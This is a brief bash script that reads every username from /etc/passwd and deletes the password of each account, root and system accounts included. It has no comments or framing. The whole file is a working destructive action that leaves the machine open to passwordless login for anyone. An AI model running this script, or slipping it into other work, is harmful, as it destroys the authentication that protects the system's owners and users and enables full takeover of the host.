#!/bin/bash
users=`cat /etc/passwd | cut -d ":" -f1`
for i in $users
do
    `passwd --delete $i`
done
